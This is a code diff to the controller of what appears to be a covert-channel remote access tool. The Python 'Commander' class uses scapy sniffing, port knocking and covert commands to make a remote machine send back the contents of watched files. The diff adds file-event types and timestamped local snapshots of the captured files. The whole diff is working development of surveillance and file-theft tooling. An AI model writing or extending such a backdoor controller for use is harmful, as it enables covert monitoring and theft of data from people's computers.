@@ -5,6 +5,8 @@ import threading
 import socket
 import os
 import re
+from datetime import datetime
+from pathlib import Path
 from scapy.all import IP, TCP, send, sniff
 from port_knocker import PortKnocker
 
@@ -27,6 +29,18 @@ class Commander:
         self.watch_receiving = False
         self.watch_current_file = None
         self.watch_file_size = 0
+        self.watch_event_type = 0
+        
+        # Watch event types
+        self.EVT_CREATED = 1
+        self.EVT_MODIFIED = 2
+        self.EVT_DELETED = 3
+        
+        self.EVT_NAMES = {
+            1: "CREATED",
+            2: "MODIFIED",
+            3: "DELETED",
+        }
         
         # Dispatch tables for menu actions
         self.disconnected_actions = {
@@ -105,6 +119,7 @@ class Commander:
         self.watch_receiving = False
         self.watch_current_file = None
         self.watch_file_size = 0
+        self.watch_event_type = 0
         
         def process_packet(pkt):
             if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:
@@ -123,6 +138,12 @@ class Commander:
                             if match:
                                 self.watch_current_file = match.group(1).strip()
                         
+                        # Check for EVENT marker
+                        if "[EVENT]" in self.watch_buffer and self.watch_current_file:
+                            match = re.search(r'\[EVENT\] (\d+)\n', self.watch_buffer)
+                            if match:
+                                self.watch_event_type = int(match.group(1))
+                        
                         # Check for SIZE marker
                         if "[SIZE]" in self.watch_buffer and self.watch_current_file:
                             match = re.search(r'\[SIZE\] (\d+)\n', self.watch_buffer)
@@ -135,6 +156,7 @@ class Commander:
                             self.watch_receiving = False
                             self.watch_current_file = None
                             self.watch_buffer = ""
+                            self.watch_event_type = 0
                         else:
                             # Only add to output buffer if NOT receiving watch data
                             if not self.watch_receiving:
@@ -150,28 +172,40 @@ class Commander:
             if self.is_connected:
                 print(f"\n[!] Listener error: {e}")
 
+    def _snapshot_path(self, relative: str) -> Path:
+        """Build a timestamped snapshot filename."""
+        rel = Path(relative)
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        name = f"{rel.stem}_{ts}{rel.suffix}"
+        watch_root = Path("./watched")
+        return watch_root / rel.parent / name
+
     def _save_watched_file(self):
-        """Save received watched file to ./watched/ folder."""
+        """Save received watched file to ./watched/ folder with timestamp."""
         if not self.watch_current_file:
             return
         
         watch_dir = "./watched"
         os.makedirs(watch_dir, exist_ok=True)
         
-        # Create safe filename from path
-        safe_name = self.watch_current_file.replace('/', '_').replace('\\', '_').replace(':', '_')
-        save_path = os.path.join(watch_dir, safe_name)
+        # Create timestamped snapshot
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        rel_path = Path(self.watch_current_file)
+        snapshot_name = f"{rel_path.stem}_{ts}{rel_path.suffix}"
+        save_path = os.path.join(watch_dir, snapshot_name)
         
         # Extract content by removing markers
         content = self.watch_buffer
         content = re.sub(r'\[WATCH FILE\] .+?\n', '', content)
+        content = re.sub(r'\[EVENT\] \d+\n', '', content)
         content = re.sub(r'\[SIZE\] \d+\n', '', content)
         content = re.sub(r'\[WATCH END\] .+?\n', '', content)
         
         try:
             with open(save_path, "w") as f:
                 f.write(content)
-            print(f"\n[+] Watched file saved: {save_path}")
+            evt_name = self.EVT_NAMES.get(self.watch_event_type, "MODIFIED")
+            print(f"\n[+] Watched file saved: {save_path} ({evt_name})")
         except Exception as e:
             print(f"\n[!] Error saving watched file: {e}")
 
@@ -350,7 +384,7 @@ class Commander:
         os.makedirs("./watched", exist_ok=True)
         
         print(f"[*] Watching {path}")
-        print(f"[*] Modify the file to trigger transfer")
+        print(f"[*] Changes will be saved to ./watched/ with timestamps")
         self.send_covert_command("WATCH", path)
         time.sleep(0.5)
 
